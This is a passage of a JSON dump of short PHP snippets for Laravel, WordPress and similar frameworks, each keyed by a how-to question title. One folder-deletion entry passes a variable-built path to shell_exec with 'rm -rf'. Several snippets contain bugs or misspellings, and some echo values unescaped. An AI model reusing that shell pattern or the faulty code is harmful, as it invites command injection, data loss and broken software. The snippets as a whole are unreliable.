    "description": "<?php  // ACF REPEATER - BASIC LOOP  // check if the repeater field has rows of data if( have_rows('repeater_field_name') ):   \t// loop through the rows of data     while ( have_rows('repeater_field_name') ) : the_row();          // display a sub field value         the_sub_field('sub_field_name');      endwhile;  else :      // no rows found  endif;  ?>\n<?php if( have_rows('repeater_field_name') ):  \twhile( have_rows('repeater_field_name') ): the_row();  \t\t$image = get_sub_field('image'); \tendwhile; endif; ?>\n<?php if( have_rows('repeater_field_name') ): ?>  \t<ul class=\"slides\">  \t<?php while( have_rows('repeater_field_name') ): the_row();   \t\t// vars \t\t$image = get_sub_field('image'); \t\t$content = get_sub_field('content'); \t\t$link = get_sub_field('link');  \t\t?>  \t\t<li class=\"slide\">  \t\t\t<?php if( $link ): ?> \t\t\t\t<a href=\"<?php echo $link; ?>\"> \t\t\t<?php endif; ?>  \t\t\t\t<img src=\"<?php echo $image['url']; ?>\" alt=\"<?php echo $image['alt'] ?>\" />  \t\t\t<?php if( $link ): ?> \t\t\t\t</a> \t\t\t<?php endif; ?>  \t\t    <?php echo $content; ?>  \t\t</li>  \t<?php endwhile; ?>  \t</ul>  <?php endif; ?>\n<?php if( have_rows('slides') ): ?>     <ul class=\"slides\">     <?php while( have_rows('slides') ): the_row();          $image = get_sub_field('image');         ?>         <li>             <?php echo wp_get_attachment_image( $image, 'full' ); ?>             <p><?php the_sub_field('caption'); ?></p>         </li>     <?php endwhile; ?>     </ul> <?php endif; ?>\nif( have_rows('rating_field') ):   while ( have_rows('rating_field') ) : the_row();     $title = the_sub_field('rating_title');     $number = the_sub_field('rating_number');      echo $title;     echo $number;   endwhile; else : endif;\n",
    "reg_date": "2021-10-12T10:14:06.000Z"
  },
  {
    "id": 1238,
    "keyword": null,
    "link": null,
    "title": " get action name in yii2",
    "description": "echo $this->action->id;\n",
    "reg_date": "2021-10-12T10:14:06.000Z"
  },
  {
    "id": 1239,
    "keyword": null,
    "link": null,
    "title": " get age with carbon in laravel",
    "description": "use Carbon\\Carbon; // Include Class in COntroller  $request->date_of_birth = \"2000-10-25\"; $age = Carbon::parse($request->date_of_birth)->diff(Carbon::now())->y;  dd($age. \" Years\");\n",
    "reg_date": "2021-10-12T10:14:06.000Z"
  },
  {
    "id": 1240,
    "keyword": null,
    "link": null,
    "title": " get all class methods php",
    "description": " get_class_methods(object|string $object_or_class): array\npublic ReflectionClass::getMethods(int|null $filter = null): array\n",
    "reg_date": "2021-10-12T10:14:07.000Z"
  },
  {
    "id": 1241,
    "keyword": null,
    "link": null,
    "title": " get all data eloquent laravel",
    "description": "// To Get All ModelClassName::where('Active','=',1)->get();\nBlog::all();  //example usage. $posts = Blog::all();\n// Get all rows from Eloquent model Model::get(); \t//Get all the cars     $cars = App\\Models\\Cars::get();  // Get all rows from Eloquent model where column matches the given value Model::where('column', {value})->get(); \t//Get all the blue cars \t$blue_cars = App\\Models\\Cars::where('color', 'blue')->get(); \t//Get all the green cars \t$looking_for = 'green'; \t$green_cars = App\\Models\\Cars::where('color', $looking_for)->get();  // Get all rows from Eloquent model where column is matched conditionally Model::where('column', {condition}, {value})->get(); \t//Get all the antique cars     $antiques = App\\Models\\Cars::where('year', '<=', 2000)->get();  // Get all rows from Eloquent model with multiple where conditions \t//Get all the green antique cars     $green_antiques = App\\Models\\Cars::where(       [         \t['color', 'green'],         \t['year', '<=', 2000],       ]     )->get();  // For very large data sets use cursor() rather than get(); Model::where('column', {value})->cursor(); // Or limits Model::where('column', {value})->limit({n})->get(); \t// Get the first 10 green cars \t$some_green_cars =        App\\Models\\Cars::where('color', 'green')->limit(10)->get(); \n",
    "reg_date": "2021-10-12T10:14:07.000Z"
  },
  {
    "id": 1242,
    "keyword": null,
    "link": null,
    "title": " get all errors view laravel",
    "description": "@if($errors->any())     {{ implode('', $errors->all('<div>:message</div>')) }} @endif\n",
    "reg_date": "2021-10-12T10:14:07.000Z"
  },
  {
    "id": 1243,
    "keyword": null,
    "link": null,
    "title": " get all key from array php",
    "description": "<?php $array1=array(\"Orange\" => 100, \"Apple\" => 200, \"Banana\" => 300, \"Cherry\" => 400); print_r(array_keys($array1)); ?>  \n",
    "reg_date": "2021-10-12T10:14:07.000Z"
  },
  {
    "id": 1244,
    "keyword": null,
    "link": null,
    "title": " get all laravel validation failed messages",
    "description": "$errors = $validator->errors()->getMessages();\n$messages = $validator->errors()->getMessages(); var_dump($messages); \n",
    "reg_date": "2021-10-12T10:14:07.000Z"
  },
  {
    "id": 1245,
    "keyword": null,
    "link": null,
    "title": " get all pages list from specific template",
    "description": "$args = array(     'post_type' => 'page',     'posts_per_page' => -1,     'meta_query' => array(         array(             'key' => '_wp_page_template',             'value' => 'page_list_R_ea_modelling_instructor_led.php' // Template file name         )     ) ); $the_pages = new WP_Query( $args );  echo \"<pre>\";print_r($the_pages->posts);exit;\nglobal $wpdb;  $sql = \"SELECT post_title, meta_value   FROM $wpdb->posts a   JOIN $wpdb->postmeta b ON a.ID = b.post_id   WHERE a.post_type = 'page'   AND a.post_status = 'publish'   AND b.meta_key = '_wp_page_template'         \";  $pages = $wpdb->get_results($sql);  echo '<pre>'; print_r($pages); echo '</pre>';\n",
    "reg_date": "2021-10-12T10:14:07.000Z"
  },
  {
    "id": 1246,
    "keyword": null,
    "link": null,
    "title": " get all post values in php",
    "description": "//Loop all POST values. foreach ($_POST as $key => $value) {     echo \"Field \".htmlspecialchars($key).\" is \".htmlspecialchars($value).\"<br>\"; }\n",
    "reg_date": "2021-10-12T10:14:07.000Z"
  },
  {
    "id": 1247,
    "keyword": null,
    "link": null,
    "title": " get all routes laravel",
    "description": "php artisan route:list\n",
    "reg_date": "2021-10-12T10:14:07.000Z"
  },
  {
    "id": 1248,
    "keyword": null,
    "link": null,
    "title": " get all sort by laravel",
    "description": "$users = DB::table('users')          -> orderBy('name', 'desc')          -> get();\n$results = Project::orderBy('name')->get();\n",
    "reg_date": "2021-10-12T10:14:07.000Z"
  },
  {
    "id": 1249,
    "keyword": null,
    "link": null,
    "title": " get all values inside session laravel",
    "description": "If you just want to see contents of session, try dd():  dd(session()->all());  If not, just use this to get all info:  $data = session()->all();\n$data = $request->session()->all();\n",
    "reg_date": "2021-10-12T10:14:07.000Z"
  },
  {
    "id": 1250,
    "keyword": null,
    "link": null,
    "title": " get apache php version",
    "description": "sudo a2dismod php5 sudo a2enmod php7.0 \n",
    "reg_date": "2021-10-12T10:14:08.000Z"
  },
  {
    "id": 1251,
    "keyword": null,
    "link": null,
    "title": " get app url in laravel",
    "description": "env('APP_URL')\nURL::to('/');\n",
    "reg_date": "2021-10-12T10:14:08.000Z"
  },
  {
    "id": 1252,
    "keyword": null,
    "link": null,
    "title": " get array key php",
    "description": "<?php $array = array(     'fruit1' => 'apple',     'fruit2' => 'orange',     'fruit3' => 'grape',     'fruit4' => 'apple',     'fruit5' => 'apple');  $keys = array_keys($array);\t\t// return array $values = array_values($array);\t// return array ?>\n <?php $array = array(0 => 'blue', 1 => 'red', 2 => 'green', 3 => 'red');  $key = array_search('green', $array); // $key = 2; $key = array_search('red', $array);   // $key = 1; ?>  \narray_keys ($array); // It returns an array // more informations at https://www.php.net/manual/fr/function.array-keys.php (fr)\n$people = array(   2 => array(     'name' => 'John',     'fav_color' => 'green'   ),   5=> array(     'name' => 'Samuel',     'fav_color' => 'blue'   )); $found_key = array_search('blue', array_column($people, 'fav_color'));\n <?php $array = array(     'fruit1' => 'apple',     'fruit2' => 'orange',     'fruit3' => 'grape',     'fruit4' => 'apple',     'fruit5' => 'apple');  // this cycle echoes all associative array // key where value equals \"apple\" for($i = 0; $i< sizeof($array);$i++){ if (key($array[$i]) == 'apple') {         echo key($array).'<br />';     }     //next($array); } ?>  \n <?php $array = array(     'fruit1' => 'apple',     'fruit2' => 'orange',     'fruit3' => 'grape',     'fruit4' => 'apple',     'fruit5' => 'apple');  // this cycle echoes all associative array // key where value equals \"apple\" while ($fruit_name = current($array)) {     if ($fruit_name == 'apple') {         echo key($array).'<br />';     }     next($array); } ?>  \n",
    "reg_date": "2021-10-12T10:14:08.000Z"
  },
  {
    "id": 1253,
    "keyword": null,
    "link": null,
    "title": " get array length using php",
    "description": "<?php \t$arr = [\"one\", \"two\", \"three\", \"four\"]; \techo count($arr);   ?>\ncount($myArray);\n// using count() we can get proper length of the array $names = array(\"Ankur\",\"Raj\",\"Ram\",\"Suresh\"); // pass array into count() as parameter it will return array length echo count($names);  // output : 4\n",
    "reg_date": "2021-10-12T10:14:08.000Z"
  },
  {
    "id": 1254,
    "keyword": null,
    "link": null,
    "title": " get base url  in magento 2",
    "description": "$objectManager = \\Magento\\Framework\\App\\ObjectManager::getInstance(); $storeManager = $objectManager->get('\\Magento\\Store\\Model\\StoreManagerInterface'); $storeManager->getStore()->getBaseUrl(); \n",
    "reg_date": "2021-10-12T10:14:08.000Z"
  },
  {
    "id": 1255,
    "keyword": null,
    "link": null,
    "title": " get boundary post wordpress",
    "description": "<?php   // Link with title of latest post in current post&rsquo;s category    $latest= get_boundary_post(true, '', false, 'category');    if (!empty($latest)) { foreach ($latest as $post) { ?>    <a href=\"<?php echo the_permalink($post->ID); ?>\"><?php echo $post->post_title; ?></a> <?php }} ?> \n<?php   // Link with title of first post in current post&rsquo;s category    $first= get_boundary_post(true, '', true, 'category');    if (!empty($first)) { foreach ($first as $post) { ?>    <a href=\"<?php echo the_permalink($post->ID); ?>\"><?php echo $post->post_title; ?></a> <?php }} ?> \n",
    "reg_date": "2021-10-12T10:14:08.000Z"
  },
  {
    "id": 1256,
    "keyword": null,
    "link": null,
    "title": " get category hierarchy to the top laravel",
    "description": "<?php  namespace App;  use Illuminate\\Database\\Eloquent\\Model;  class Category extends Model {     // One level child     public function child() {         return $this->hasMany('App\\Category', 'parent_category_id');     }      // Recursive children     public function children() {         return $this->hasMany('App\\Category', 'parent_category_id')           \t\t\t->with('children');     }      // One level parent     public function parent() {         return $this->belongsTo('App\\Category', 'parent_category_id');     }      // Recursive parents     public function parents() {         return $this->belongsTo('App\\Category', 'parent_category_id')           \t\t\t->with('parent');     }  }\n",
    "reg_date": "2021-10-12T10:14:08.000Z"
  },
  {
    "id": 1257,
    "keyword": null,
    "link": null,
    "title": " get child theme path in wordpress",
    "description": "get_stylesheet_directory() oR  get_theme_file_uri()\n",
    "reg_date": "2021-10-12T10:14:09.000Z"
  },
  {
    "id": 1258,
    "keyword": null,
    "link": null,
    "title": " get class name from object php",
    "description": "get_class($this);\n// create an object $bar = new foo();  // external call echo \"Its name is \" , get_class($bar) , \"\\n\";\nget_class($object);\n",
    "reg_date": "2021-10-12T10:14:09.000Z"
  },
  {
    "id": 1259,
    "keyword": null,
    "link": null,
    "title": " get client size in laravel",
    "description": "$size = $request->file(\"image\")->getSize();\n",
    "reg_date": "2021-10-12T10:14:09.000Z"
  },
  {
    "id": 1260,
    "keyword": null,
    "link": null,
    "title": " get contents of a tmp file php",
    "description": "$file = $_FILES['file']['tmp_name']; // It is the path to the file $data = file_get_contents($file);\n",
    "reg_date": "2021-10-12T10:14:09.000Z"
  },
  {
    "id": 1261,
    "keyword": null,
    "link": null,
    "title": " get count laravel",
    "description": "$count = ModelName::where('id',$id)->count();\n$count = Model::where('status','=','1')->count();\n      {{ $threads->count() }} \n$wordlist = Wordlist::where('id', '<=', $correctedComparisons)->get(); $wordCount = $wordlist->count();\n      {{ count($threads) }} \n",
    "reg_date": "2021-10-12T10:14:09.000Z"
  },
  {
    "id": 1262,
    "keyword": null,
    "link": null,
    "title": " get count of relationship table laravel",
    "description": "Category::where('parent_id', 0)->withCount('articles')->get(); \n",
    "reg_date": "2021-10-12T10:14:09.000Z"
  },
  {
    "id": 1263,
    "keyword": null,
    "link": null,
    "title": " get count sql query in php",
    "description": "$result=mysql_query(\"SELECT count(*) as total from Students\"); $data=mysql_fetch_assoc($result); echo $data['total']; \n$sql = \"SELECT COUNT(*) AS total from Members\"; $result = $conn->query($sql); $data =  $result->fetch_assoc(); echo $data['total'];\nPHP Count result\n",
    "reg_date": "2021-10-12T10:14:09.000Z"
  },
  {
    "id": 1264,
    "keyword": null,
    "link": null,
    "title": " get current date carbon laravel",
    "description": "use Carbon\\Carbon; $date = Carbon::now(); //Get date and time $date->toDateTimeString(); //Get date $date->toDateString();\nuse Carbon\\Carbon; $date = Carbon::now();\n$today = Carbon::now()->format('Y-m-d'); //yyyy-mm-dd etc\n",
    "reg_date": "2021-10-12T10:14:09.000Z"
  },
  {
    "id": 1265,
    "keyword": null,
    "link": null,
    "title": " get current date laravel",
    "description": "use Carbon\\Carbon; $date = Carbon::now(); //Get date and time $date->toDateTimeString(); //Get date $date->toDateString();\nuse Carbon\\Carbon; $date = Carbon::now();\n",
    "reg_date": "2021-10-12T10:14:10.000Z"
  },
  {
    "id": 1266,
    "keyword": null,
    "link": null,
    "title": " get current month php",
    "description": "current month   //half name in words   date('M'); //full name in words date('F'); //number date('m');\n$month = date(\"m\",strtotime($mydate));\n//get first day of the current month  $start = date(\"Y-m-1 00:00:00\"); //get current date of the month $end = date(\"Y-m-d H:i:s\");  //query data for the current month so far $query = $this->db_model->run_query(\"select column_1, column_2 from table where date_column BETWEEN '\".$start.\"' AND '\".$end.\"'\");\ndate('m');\necho 'Day' . date('d', strtotime($row['Date'])); echo 'Month' . date('m', strtotime($row['Date'])); echo 'Year' . date('Y', strtotime($row['Date']));\n",
    "reg_date": "2021-10-12T10:14:10.000Z"
  },
  {
    "id": 1267,
    "keyword": null,
    "link": null,
    "title": " get current month record in laravel",
    "description": "User::whereMonth('created_at', date('m')) ->whereYear('created_at', date('Y')) ->get(['name','created_at']);\n",
    "reg_date": "2021-10-12T10:14:10.000Z"
  },
  {
    "id": 1268,
    "keyword": null,
    "link": null,
    "title": " get current page php",
    "description": "<?php $uri = $_SERVER['REQUEST_URI']; echo $uri; // Outputs: URI   $protocol = ((!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] != 'off') || $_SERVER['SERVER_PORT'] == 443) ? \"https://\" : \"http://\";  $url = $protocol . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI']; echo $url; // Outputs: Full URL   $query = $_SERVER['QUERY_STRING']; echo $query; // Outputs: Query String ?>\n<?php       if(isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on')             $url = \"https://\";        else            $url = \"http://\";        // Append the host(domain name, ip) to the URL.        $url.= $_SERVER['HTTP_HOST'];             // Append the requested resource location to the URL        $url.= $_SERVER['REQUEST_URI'];                echo $url;     ?> \n<?php       if(isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on')             $url = \"https://\";        else            $url = \"http://\";        // Append the host(domain name, ip) to the URL.        $url.= $_SERVER['HTTP_HOST'];             // Append the requested resource location to the URL        $url.= $_SERVER['REQUEST_URI'];                echo $url;     ?>   \n$protocol = strpos(strtolower($_SERVER['SERVER_PROTOCOL']),'https') === FALSE ? 'http' : 'https'; $host     = $_SERVER['HTTP_HOST']; $script   = $_SERVER['SCRIPT_NAME']; $params   = $_SERVER['QUERY_STRING'];   $currentUrl = $protocol . '://' . $host . $script . '?' . $params;   echo $currentUrl;\n",
    "reg_date": "2021-10-12T10:14:10.000Z"
  },
  {
    "id": 1269,
    "keyword": null,
    "link": null,
    "title": " get current page slug",
    "description": "$slug = get_queried_object()->post_name;\n",
    "reg_date": "2021-10-12T10:14:10.000Z"
  },
  {
    "id": 1270,
    "keyword": null,
    "link": null,
    "title": " get current route in blade laravel",
    "description": "Route::currentRouteName()\nGet the current url  here using the Request::url() method. It will return the entire URL, but strip the query string from it.  <p> Url: {{  Request::url() }} </p> Output  Url: http://localhost:8000/post/demo\n<p> Path: {{ Request::path() }} </p>\nPath: post/demo\n",
    "reg_date": "2021-10-12T10:14:10.000Z"
  },
  {
    "id": 1271,
    "keyword": null,
    "link": null,
    "title": " get current route laravel",
    "description": "Route::currentRouteName()\nGet the current url  here using the Request::url() method. It will return the entire URL, but strip the query string from it.  <p> Url: {{  Request::url() }} </p> Output  Url: http://localhost:8000/post/demo\nget URL: {{ Request::url() }} // http://localhost/path  get path: {{ Request::path() }} // path\nrequest()->route()->getName()\n\\Route::current() ############### OR #################### $request->getRequestUri()\n<p> Path: {{ Request::path() }} </p>\n",
    "reg_date": "2021-10-12T10:14:10.000Z"
  },
  {
    "id": 1272,
    "keyword": null,
    "link": null,
    "title": " get current shipping method woocommerce",
    "description": "$rate_table = array();  $shipping_methods = WC()->shipping->get_shipping_methods();  foreach($shipping_methods as $shipping_method){     $shipping_method->init();      foreach($shipping_method->rates as $key=>$val)         $rate_table[$key] = $val->label; }  echo $rate_table[WC()->session->get( 'chosen_shipping_methods' )[0]]; \n$chosen_shipping_method_price = WC()->session->get('cart_totals')['shipping_total'];\n$shipping_classes = get_terms( array('taxonomy' => 'product_shipping_class', 'hide_empty' => false ) );\n",
    "reg_date": "2021-10-12T10:14:10.000Z"
  },
  {
    "id": 1273,
    "keyword": null,
    "link": null,
    "title": " get current term id",
    "description": "<?php $current_term = get_queried_object()->term_id; ?>\nget_queried_object()->term_id;\n",
    "reg_date": "2021-10-12T10:14:10.000Z"
  },
  {
    "id": 1274,
    "keyword": null,
    "link": null,
    "title": " get current user first and last name wordpress",
    "description": "    $current_user = wp_get_current_user();          echo 'Username: ' . $current_user->user_login . '<br />';     echo 'User email: ' . $current_user->user_email . '<br />';     echo 'User first name: ' . $current_user->user_firstname . '<br />';     echo 'User last name: ' . $current_user->user_lastname . '<br />';     echo 'User display name: ' . $current_user->display_name . '<br />';     echo 'User ID: ' . $current_user->ID . '<br />';\n",
    "reg_date": "2021-10-12T10:14:11.000Z"
  },
  {
    "id": 1275,
    "keyword": null,
    "link": null,
    "title": " get current year php",
    "description": "// get current year using php <?php echo date(\"Y\"); ?>\n$currentYear=date(\"Y\");//2019\n$year = date(\"y\",strtotime($mydate));\n// current year <?php echo date(\"Y\"); ?> // current month <?php echo date(\"m\"); ?> // current day <?php echo date(\"d\"); ?>\nGet the current year using PHP:    <?php  \techo date(\"Y\");  ?>\n",
    "reg_date": "2021-10-12T10:14:11.000Z"
  },
  {
    "id": 1276,
    "keyword": null,
    "link": null,
    "title": " get custom field",
    "description": "/* put this code in home.php file create in child theme  */  <?php   /*Template Name: Home Template*/   echo get_post_meta($post->ID, 'Name', true);     ?>  /* Or use this code  */  <?php  \t$value =get_field('Name'); \techo $value; ?>\n$value = get_field( \"text_field\" );  if( $value ) {     echo $value; } else {     echo 'empty'; }\necho '<pre>'; print_r(get_post_custom($post_id)); echo '</pre>';\n",
    "reg_date": "2021-10-12T10:14:11.000Z"
  },
  {
    "id": 1277,
    "keyword": null,
    "link": null,
    "title": " get data based on date in laravel",
    "description": "PrescriptionTbl::whereDate('created_at', date('Y-m-d'))->get();\n",
    "reg_date": "2021-10-12T10:14:11.000Z"
  },
  {
    "id": 1278,
    "keyword": null,
    "link": null,
    "title": " get data from database in dropdown list php",
    "description": "<?php $connect = new mysqli(\"127.0.0.1\",\"root\",\"\");  \t\t\tif ($connect -> connect_errno) \t\t\t\t{ \t\t\t  \t\techo \"Failed to connect to MySQL: \" . $connect -> connect_error; \t\t\t  \t\texit(); \t\t\t\t}  \t\t\t\t\t$connect -> select_db(\"Your Database\"); \t\t\t\tif ($result = $connect -> query(\"Your query\"))    \t\t\t\t{ \t\t\t  \t\t \t\t\t\t} \t\t\t\techo \"<select>\"; \t\t\t\twhile($row = mysqli_fetch_array($result))  \t\t\t\t{ \t\t\t\t\techo \"<option>\" . $row['Your columns'] . \"</option>\" \t\t\t\t} \t\t\t\techo \"</select>\" ?>\n",
    "reg_date": "2021-10-12T10:14:11.000Z"
  },
  {
    "id": 1279,
    "keyword": null,
    "link": null,
    "title": " get data from select option php",
    "description": "// Page containing a form: <form action=\"myaction.php\" method=\"post\">  <select name=\"fruit\">     <option value=\"Apple\">Apple</option>     <option value=\"Banana\">Banana</option>  </select>    <input type=\"submit\" value=\"Submit\"> </form>  // myaction.php Hello <?php echo htmlspecialchars($_POST['fruit']); ?>\n",
    "reg_date": "2021-10-12T10:14:11.000Z"
  },
  {
    "id": 1280,
    "keyword": null,
    "link": null,
    "title": " get database name laravel",
    "description": "DB::getDatabaseName();\nDB::connection()->getDatabaseName() //laravel\n",
    "reg_date": "2021-10-12T10:14:11.000Z"
  },
  {
    "id": 1281,
    "keyword": null,
    "link": null,
    "title": " get date php",
    "description": "$today = date(\"F j, Y, g:i a\");   // October 30, 2019, 10:42 pm $today = date(\"D M j G:i:s T Y\"); // Wed Oct 30 22:42:18 UTC 2019 $today = date(\"Y-m-d H:i:s\");     // 2019-10-30 22:42:18(MySQL DATETIME format)\n<?php  // Use date    echo date(\"F j, Y, g:i a\");                   // March 10, 2001, 5:16 pm echo date(\"m.d.y\");                           // 03.10.01 echo date(\"j, n, Y\");                         // 10, 3, 2001 echo date(\"Ymd\");                             // 20010310 echo date('h-i-s, j-m-y, it is w Day');       // 05-16-18, 10-03-01, 1631 1618 6 Satpm01 echo date('\\i\\t \\i\\s \\t\\h\\e jS \\d\\a\\y.');     // It is the 10th day. echo date(\"D M j G:i:s T Y\");                 // Sat Mar 10 17:16:18 MST 2001 echo date('H:m:s \\m \\i\\s\\ \\t\\h\\e\\ \\m\\o\\n\\t\\h'); // 17:03:18 m is the month echo date(\"H:i:s\");                           // 17:16:18 echo date(\"Y-m-d H:i:s\");                     // 2001-03-10 17:16:18 Mysql format  ?>\n$timestamp = strtotime('2009-10-22');  $day = date('D', $timestamp); var_dump($day);\ndate(\"Y-m-d h:i:sa\")\ndate(\"Y-n-j G:i:s\"); //-->2020-10-29 23:27:15\n// 1. create a date instance $date = new DateTime;  // 2. set the date using the setDate(year, month, date) method on the //    $date instance $date->setDate(1999,02,19);\n",
    "reg_date": "2021-10-12T10:14:11.000Z"
  },
  {
    "id": 1282,
    "keyword": null,
    "link": null,
    "title": " get day from date php",
    "description": "$timestamp = strtotime('2009-10-22');  $day = date('D', $timestamp); var_dump($day);\n$dayofweek = date('w', strtotime($date)); $result    = date('Y-m-d', strtotime(($day - $dayofweek).' day', strtotime($date)));\n// Prints the day echo date(\"l\") . \"<br>\";\n// get day of month php // Method 1; some server not work, I had check php 7.3.24 not worked, php 7.3.8 worked cal_days_in_month(CAL_GREGORIAN, $month, $year) echo (cal_days_in_month(CAL_GREGORIAN, 2, 2020)); // => 29  // Method 2; function days_in_month($month, $year) {     // calculate number of days in a month     return $month == 2 ? ($year % 4 ? 28 : ($year % 100 ? 29 : ($year % 400 ? 28 : 29))) : (($month - 1) % 7 % 2 ? 30 : 31); }  // Method 3; echo (date('t', strtotime('2020-02-1')));\t// 29   \n<?php // set the default timezone to use. Available since PHP 5.1 date_default_timezone_set('UTC');   // Prints something like: Monday echo date(\"l\");  // Prints something like: Monday 8th of August 2005 03:12:46 PM echo date('l jS \\of F Y h:i:s A');  // Prints: July 1, 2000 is on a Saturday echo \"July 1, 2000 is on a \" . date(\"l\", mktime(0, 0, 0, 7, 1, 2000));  /* use the constants in the format parameter */ // prints something like: Wed, 25 Sep 2013 15:28:57 -0700 echo date(DATE_RFC2822);  // prints something like: 2000-07-01T00:00:00+00:00 echo date(DATE_ATOM, mktime(0, 0, 0, 7, 1, 2000)); ?>\n$today = date(\"d\"); //Can Convert TO Int print_r($today);\n",
    "reg_date": "2021-10-12T10:14:11.000Z"
  },
  {
    "id": 1283,
    "keyword": null,
    "link": null,
    "title": " get day of month php",
    "description": "$month = date(\"m\",strtotime($mydate));\n$dayofweek = date('w', strtotime($date)); $result    = date('Y-m-d', strtotime(($day - $dayofweek).' day', strtotime($date)));\n$lastDateOfNextMonth =strtotime('last day of next month') ;  $lastDay = date('d/m/Y', $lastDateOfNextMonth);     print_r($lastDay);\n// get day of month php // Method 1; some server not work, I had check php 7.3.24 not worked, php 7.3.8 worked cal_days_in_month(CAL_GREGORIAN, $month, $year) echo (cal_days_in_month(CAL_GREGORIAN, 2, 2020)); // => 29  // Method 2; function days_in_month($month, $year) {     // calculate number of days in a month     return $month == 2 ? ($year % 4 ? 28 : ($year % 100 ? 29 : ($year % 400 ? 28 : 29))) : (($month - 1) % 7 % 2 ? 30 : 31); }  // Method 3; echo (date('t', strtotime('2020-02-1')));\t// 29   \necho cal_days_in_month(CAL_GREGORIAN, 8, 2009); \n$mydate = '2016-01-01'; echo date('l, F jS, Y', strtotime($mydate)); # Friday, January 1st, 2016 \n",
    "reg_date": "2021-10-12T10:14:12.000Z"
  },
  {
    "id": 1284,
    "keyword": null,
    "link": null,
    "title": " get declared classes",
    "description": "<?php print_r(get_declared_classes()); ?>\n",
    "reg_date": "2021-10-12T10:14:12.000Z"
  },
  {
    "id": 1285,
    "keyword": null,
    "link": null,
    "title": " get delete folder in php",
    "description": "function deleteDirectory($dir) {     if (!file_exists($dir)) {         return true;     }      if (!is_dir($dir)) {         return unlink($dir);     }      foreach (scandir($dir) as $item) {         if ($item == '.' || $item == '..') {             continue;         }          if (!deleteDirectory($dir . DIRECTORY_SEPARATOR . $item)) {             return false;         }      }      return rmdir($dir); } \nrmdir ( string $dirname , resource $context = ? ) : bool\n$dirPath = \"../images/productimages/$productid\"; \tif (is_dir($dirPath)) { \t\tshell_exec(\"rm -rf \" . $dirPath); \t\trrmdir($dirPath); \t}  // call function  function rrmdir($src) {     $dir = opendir($src);     while(false !== ( $file = readdir($dir)) ) {         if (( $file != '.' ) && ( $file != '..' )) {             $full = $src . '/' . $file;             if ( is_dir($full) ) {                 rrmdir($full);             }             else {                 unlink($full);             }         }     }     closedir($dir);     rmdir($src); }  \n",
    "reg_date": "2021-10-12T10:14:12.000Z"
  },
  {
    "id": 1286,
    "keyword": null,
    "link": null,
    "title": " get deleted value laravel",
    "description": "You can get also soft deleted record using withTrashed() of Laravel  Eloquent. It will return all record from table.  Item::withTrashed()->get();  You can get only soft deleted row using onlyTrashed() of Laravel Eloquent.  Item::onlyTrashed()->get();\n",
    "reg_date": "2021-10-12T10:14:12.000Z"
  },
  {
    "id": 1287,
    "keyword": null,
    "link": null,
    "title": " get domain from url cakephp",
    "description": "Router::url('/', true) . 'img/example.png' (cakephp 2)\n",
    "reg_date": "2021-10-12T10:14:12.000Z"
  },
  {
    "id": 1288,
    "keyword": null,
    "link": null,
    "title": " get duplicate value from array php",
    "description": "<?php $fruits_list = array('Orange',  'Apple', ' Banana', 'Cherry', ' Banana'); $result = array_unique($fruits_list); print_r($result); ?>    Output:  Array ( [0] => Orange [1] => Apple [2] => Banana [3] => Cherry ) \n$arr = array(1, 4, 6, 1, 8, 9, 4, 6);  $unique = array_unique($arr);  $duplicates = array_diff_assoc($arr, $unique);  print_r($duplicates); Array ( [3] => 1 [6] => 4 [7] => 6 )\nfunction has_dupes($array) {     $dupe_array = array();     foreach ($array as $val) {         if (++$dupe_array[$val] > 1) {             return true;         }     }     return false; }\n",
    "reg_date": "2021-10-12T10:14:12.000Z"
  },
  {
    "id": 1289,
    "keyword": null,
    "link": null,
    "title": " get env app url laravel",
    "description": "env('APP_URL')\ndd(env('APP_NAME'));\nURL::to('/');\n",
    "reg_date": "2021-10-12T10:14:12.000Z"
  },
  {
    "id": 1290,
    "keyword": null,
    "link": null,
    "title": " get extension from filename php",
    "description": "$ext = pathinfo($filename, PATHINFO_EXTENSION);\n// Here is a quick way of fetching only the filename (without extension) regardless of what suffix the file has.  // your file $file = 'image.jpg'; $info = pathinfo($file); // Before PHP 5.2 $file_name =  basename($file, '.'.$info['extension']); // After PHP 5.2 $file_name =  $info['filename'];\n// your file $file = 'image.jpg'; $info = pathinfo($file); // Before PHP 5.2 $file_name =  basename($file, '.'.$info['extension']); // After PHP 5.2 $file_name =  $info['filename'];\n",
    "reg_date": "2021-10-12T10:14:12.000Z"
  },
  {
    "id": 1291,
    "keyword": null,
    "link": null,
    "title": " get featured image id wordpress",
    "description": "<?php if (has_post_thumbnail( $post->ID ) ): ?>   <?php $image = wp_get_attachment_image_src( get_post_thumbnail_id( $post->ID ), 'single-post-thumbnail' ); ?>   <div id=\"custom-bg\" style=\"background-image: url('<?php echo $image[0]; ?>')\">    </div> <?php endif; ?>\n<?php echo the_post_thumbnail(); ?>\nget_post_thumbnail_id($post) \n<?php if(has_post_thumbnail()){   the_post_thumnbail('cstm_name', array( 'class' => 'class1 class2' )) } else { ?>   <img class=\"card-img-top\" src=\"http://placehold.it/750x300\" alt=\"Card image cap\" class=\"img-responsive\"> <?php } ?>\n",
    "reg_date": "2021-10-12T10:14:12.000Z"
  },
  {
    "id": 1292,
    "keyword": null,
    "link": null,
    "title": " get featured image url",
    "description": "echo get_the_post_thumbnail_url();\n<?php    // ALL parameters are optional. Not needed if you are on WP LOOP   echo get_the_post_thumbnail_url( $the_query->ID, array( 500, 400) ); ?>\nif ( has_post_thumbnail()) {    $large_image_url = wp_get_attachment_image_src( get_post_thumbnail_id(), 'large');    echo '<a href=\"' . $large_image_url[0] . '\">';    the_post_thumbnail('thumbnail');    echo '</a>'; } \n",
    "reg_date": "2021-10-12T10:14:12.000Z"
  },
  {
    "id": 1293,
    "keyword": null,
    "link": null,
    "title": " get featured image url in wordpress",
